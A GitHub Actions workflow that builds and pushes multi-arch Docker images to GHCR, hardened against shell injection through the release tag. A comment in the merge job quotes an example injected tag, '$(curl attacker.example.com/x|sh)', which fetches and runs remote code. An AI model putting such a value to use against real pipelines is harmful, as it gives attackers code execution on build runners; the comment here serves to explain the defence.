name: Build and Push Docker Image to GHCR

on:
  workflow_dispatch:
    inputs:
      release_tag:
        description: 'Release tag for the image (e.g. 0.10.87)'
        required: true
        type: string
  release:
    types: [published]

permissions:
  contents: read
  packages: write

env:
  RELEASE_TAG: ${{ github.event_name == 'release' && github.event.release.tag_name || inputs.release_tag }}
  REGISTRY: ghcr.io

jobs:
  build:
    strategy:
      fail-fast: false
      matrix:
        include:
          - platform: linux/amd64
            runner: ubuntu-latest
          - platform: linux/arm64
            runner: ubuntu-24.04-arm
    runs-on: ${{ matrix.runner }}
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Log in to GitHub Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Lowercase repository name
        id: repo
        run: echo "name=${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"

      - name: Build and push by digest
        id: build
        uses: docker/build-push-action@v6
        with:
          context: .
          platforms: ${{ matrix.platform }}
          outputs: type=image,name=${{ env.REGISTRY }}/${{ steps.repo.outputs.name }},push-by-digest=true,name-canonical=true,push=true
          no-cache: true

      - name: Export digest
        run: |
          mkdir -p ${{ runner.temp }}/digests
          digest="${{ steps.build.outputs.digest }}"
          touch "${{ runner.temp }}/digests/${digest#sha256:}"

      - name: Upload digest
        uses: actions/upload-artifact@v4
        with:
          name: digests-${{ matrix.runner }}
          path: ${{ runner.temp }}/digests/*
          if-no-files-found: error
          retention-days: 1

  merge:
    runs-on: ubuntu-latest
    needs: build
    steps:
      - name: Download digests
        uses: actions/download-artifact@v4
        with:
          path: ${{ runner.temp }}/digests
          pattern: digests-*
          merge-multiple: true

      - name: Log in to GitHub Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Lowercase repository name
        id: repo
        run: echo "name=${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"

      - name: Create and push multi-arch manifest
        working-directory: ${{ runner.temp }}/digests
        # RELEASE_TAG originates from workflow_dispatch inputs (attacker-
        # controllable text) and github.event.release.tag_name (protected-tag
        # controllable, but still string data). Interpolating it directly
        # into the run: block with ${{ }} would splice it into the shell
        # script the runner executes, so a tag such as
        # ``$(curl attacker.example.com/x|sh)`` would run at build time.
        # Pass it via env: and reference it as a shell variable, and reject
        # anything outside the strict tag allowlist before use.
        env:
          RELEASE_TAG: ${{ env.RELEASE_TAG }}
          REGISTRY: ${{ env.REGISTRY }}
          REPO_NAME: ${{ steps.repo.outputs.name }}
        run: |
          set -euo pipefail
          if ! printf '%s' "$RELEASE_TAG" | grep -Eq '^[A-Za-z0-9._-]+$'; then
            echo "Refusing to publish: RELEASE_TAG contains characters outside [A-Za-z0-9._-]" >&2
            exit 1
          fi
          IMAGE="${REGISTRY}/${REPO_NAME}"
          docker buildx imagetools create \
            --tag "${IMAGE}:${RELEASE_TAG}" \
            --tag "${IMAGE}:latest" \
            $(printf "${IMAGE}@sha256:%s " *)
